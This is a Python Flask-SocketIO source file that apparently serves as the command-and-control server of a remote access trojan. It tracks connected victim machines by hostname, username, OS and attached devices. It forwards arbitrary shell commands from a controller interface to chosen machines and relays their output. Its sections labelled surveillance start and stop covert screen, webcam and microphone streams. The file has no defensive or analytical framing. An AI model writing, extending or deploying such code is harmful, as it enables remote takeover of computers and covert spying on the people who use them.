# server.py
from flask import Flask, request
from flask_socketio import SocketIO, emit
import os
from threading import Thread
import time

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'change-this-in-render-env')
socketio = SocketIO(
    app, 
    cors_allowed_origins="*", 
    async_mode='threading',
    ping_timeout=60,
    ping_interval=25,
    logger=False,
    engineio_logger=False,
    max_http_buffer_size=10*1024*1024  # 10MB for large frames
)

clients = {}

class Client:
    def __init__(self, sid, ip, hostname, username, os_info, monitors, cameras, microphones):
        self.sid = sid
        self.ip = ip
        self.hostname = hostname
        self.username = username
        self.os_info = os_info
        self.monitors = monitors
        self.cameras = cameras
        self.microphones = microphones
        self.last_seen = time.time()

def cleanup_dead_clients():
    """Remove clients that haven't sent heartbeat in 2 minutes"""
    while True:
        time.sleep(60)
        now = time.time()
        dead_clients = []
        for sid, client in list(clients.items()):
            if now - client.last_seen > 120:
                dead_clients.append(sid)
        
        for sid in dead_clients:
            if sid in clients:
                print(f"[-] Removing dead client: {clients[sid].hostname}")
                del clients[sid]
                socketio.emit('client_left', {'sid': sid}, namespace='/gui', broadcast=True)

@socketio.on('connect', namespace='/client')
def handle_client_connect():
    print(f"[+] Client connect attempt: {request.sid}")

@socketio.on('register', namespace='/client')
def handle_register(data):
    client = Client(
        sid=request.sid,
        ip=request.remote_addr,
        hostname=data.get('hostname', 'Unknown'),
        username=data.get('username', 'Unknown'),
        os_info=data.get('os_info', 'Unknown'),
        monitors=data.get('monitors', 1),
        cameras=data.get('cameras', []),
        microphones=data.get('microphones', [])
    )
    clients[request.sid] = client
    print(f"[+] Registered: {client.hostname} ({client.ip}) - {client.monitors} monitors, {len(client.cameras)} cameras, {len(client.microphones)} mics")
    
    socketio.emit('new_client', {
        'sid': request.sid,
        'ip': client.ip,
        'hostname': client.hostname,
        'username': client.username,
        'os_info': client.os_info,
        'monitors': client.monitors,
        'cameras': client.cameras,
        'microphones': client.microphones
    }, namespace='/gui', broadcast=True)
    
    emit('registered', {'status': 'ok'})

@socketio.on('heartbeat', namespace='/client')
def handle_heartbeat():
    if request.sid in clients:
        clients[request.sid].last_seen = time.time()

@socketio.on('result', namespace='/client')
def handle_result(data):
    result = data.get('result', '')
    socketio.emit('command_result', {
        'sid': request.sid,
        'result': result
    }, namespace='/gui', broadcast=True)

# Surveillance frame relay
@socketio.on('screen_frame', namespace='/client')
def handle_screen_frame(data):
    socketio.emit('screen_frame', {
        'sid': request.sid,
        'frame': data.get('frame'),
        'monitor': data.get('monitor')
    }, namespace='/gui', broadcast=True)

@socketio.on('camera_frame', namespace='/client')
def handle_camera_frame(data):
    socketio.emit('camera_frame', {
        'sid': request.sid,
        'frame': data.get('frame'),
        'camera': data.get('camera')
    }, namespace='/gui', broadcast=True)

@socketio.on('mic_audio', namespace='/client')
def handle_mic_audio(data):
    socketio.emit('mic_audio', {
        'sid': request.sid,
        'audio': data.get('audio'),
        'mic': data.get('mic')
    }, namespace='/gui', broadcast=True)

@socketio.on('disconnect', namespace='/client')
def handle_client_disconnect():
    if request.sid in clients:
        client = clients[request.sid]
        print(f"[-] Disconnected: {client.hostname}")
        del clients[request.sid]
        socketio.emit('client_left', {'sid': request.sid}, namespace='/gui', broadcast=True)

# GUI handlers
@socketio.on('connect', namespace='/gui')
def handle_gui_connect():
    print(f"[GUI] Controller connected")
    client_list = [{
        'sid': sid,
        'ip': c.ip,
        'hostname': c.hostname,
        'username': c.username,
        'os_info': c.os_info,
        'monitors': c.monitors,
        'cameras': c.cameras,
        'microphones': c.microphones
    } for sid, c in clients.items()]
    emit('client_list', {'clients': client_list})

@socketio.on('get_clients', namespace='/gui')
def handle_get_clients():
    client_list = [{
        'sid': sid,
        'ip': c.ip,
        'hostname': c.hostname,
        'username': c.username,
        'os_info': c.os_info,
        'monitors': c.monitors,
        'cameras': c.cameras,
        'microphones': c.microphones
    } for sid, c in clients.items()]
    emit('client_list', {'clients': client_list})

@socketio.on('send_command', namespace='/gui')
def handle_send_command(data):
    target_sid = data.get('sid')
    command = data.get('command')
    
    if target_sid in clients:
        print(f"[>] Command to {target_sid}: {command}")
        socketio.emit('execute', {'command': command}, room=target_sid, namespace='/client')
    else:
        emit('error', {'message': 'Client not found'})

# Surveillance control
@socketio.on('start_screen_stream', namespace='/gui')
def handle_start_screen_stream(data):
    target_sid = data.get('sid')
    monitor = data.get('monitor', 0)
    if target_sid in clients:
        socketio.emit('start_screen_stream', {'monitor': monitor}, room=target_sid, namespace='/client')

@socketio.on('stop_screen_stream', namespace='/gui')
def handle_stop_screen_stream(data):
    target_sid = data.get('sid')
    if target_sid in clients:
        socketio.emit('stop_screen_stream', {}, room=target_sid, namespace='/client')

@socketio.on('start_camera_stream', namespace='/gui')
def handle_start_camera_stream(data):
    target_sid = data.get('sid')
    camera = data.get('camera', 0)
    if target_sid in clients:
        socketio.emit('start_camera_stream', {'camera': camera}, room=target_sid, namespace='/client')

@socketio.on('stop_camera_stream', namespace='/gui')
def handle_stop_camera_stream(data):
    target_sid = data.get('sid')
    if target_sid in clients:
        socketio.emit('stop_camera_stream', {}, room=target_sid, namespace='/client')

@socketio.on('start_mic_stream', namespace='/gui')
def handle_start_mic_stream(data):
    target_sid = data.get('sid')
    mic = data.get('mic', 0)
    if target_sid in clients:
        socketio.emit('start_mic_stream', {'mic': mic}, room=target_sid, namespace='/client')

@socketio.on('stop_mic_stream', namespace='/gui')
def handle_stop_mic_stream(data):
    target_sid = data.get('sid')
    if target_sid in clients:
        socketio.emit('stop_mic_stream', {}, room=target_sid, namespace='/client')

@socketio.on('change_monitor', namespace='/gui')
def handle_change_monitor(data):
    target_sid = data.get('sid')
    monitor = data.get('monitor', 0)
    if target_sid in clients:
        socketio.emit('change_monitor', {'monitor': monitor}, room=target_sid, namespace='/client')

@socketio.on('change_camera', namespace='/gui')
def handle_change_camera(data):
    target_sid = data.get('sid')
    camera = data.get('camera', 0)
    if target_sid in clients:
        socketio.emit('change_camera', {'camera': camera}, room=target_sid, namespace='/client')

@socketio.on('change_mic', namespace='/gui')
def handle_change_mic(data):
    target_sid = data.get('sid')
    mic = data.get('mic', 0)
    if target_sid in clients:
        socketio.emit('change_mic', {'mic': mic}, room=target_sid, namespace='/client')

@app.route('/')
def index():
    return {'status': 'running', 'clients': len(clients)}, 200

@app.route('/health')
def health():
    return {'status': 'ok', 'clients': len(clients)}, 200

@app.route('/ping')
def ping():
    return 'pong', 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    
    # Start cleanup thread
    Thread(target=cleanup_dead_clients, daemon=True).start()
    
    print(f"[*] Starting server on port {port}")
    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
